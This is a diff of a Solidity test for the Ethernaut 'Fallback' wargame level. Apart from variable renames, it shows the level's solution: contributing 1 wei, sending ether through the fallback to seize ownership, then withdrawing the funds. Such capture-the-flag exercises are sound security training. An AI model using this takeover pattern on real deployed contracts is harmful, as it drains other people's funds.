@@ -13,7 +13,7 @@ contract FallbackTest is DSTest {
     Vm private constant vm = Vm(HEVM_ADDRESS);
     Ethernaut ethernaut;
     FallbackFactory fallbackFactory;
-    address eoaAddress = address(69);
+    address eoa = address(69);
 
     function setUp() public {
         // Initializing Fallback contract.
@@ -21,20 +21,20 @@ contract FallbackTest is DSTest {
         fallbackFactory = new FallbackFactory();
         ethernaut.registerLevel(fallbackFactory);
         vm.label(0xb4c79daB8f259C7Aee6E5b2Aa729821864227e84, "Fallback Owner");
-        vm.deal(eoaAddress, 1 ether);
+        vm.deal(eoa, 1 ether);
     }
 
     function testIsFallbackCleared() public {
-        vm.startPrank(eoaAddress);
-        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
-        fallbackInstance = Fallback(payable(levelAddress));
+        vm.startPrank(eoa);
+        address instance = ethernaut.createLevelInstance(fallbackFactory);
+        fallbackInstance = Fallback(payable(instance));
         fallbackInstance.contribute{value: 1 wei}();
-        assertEq(fallbackInstance.contributions(eoaAddress), 1 wei);
+        assertEq(fallbackInstance.contributions(eoa), 1 wei);
         (bool success, ) = payable(fallbackInstance).call{value: 1 wei}("");
         assertTrue(success);
         fallbackInstance.withdraw();
 
-        assertTrue(ethernaut.submitLevelInstance(payable(levelAddress)));
+        assertTrue(ethernaut.submitLevelInstance(payable(instance)));
 
         vm.stopPrank();
     }
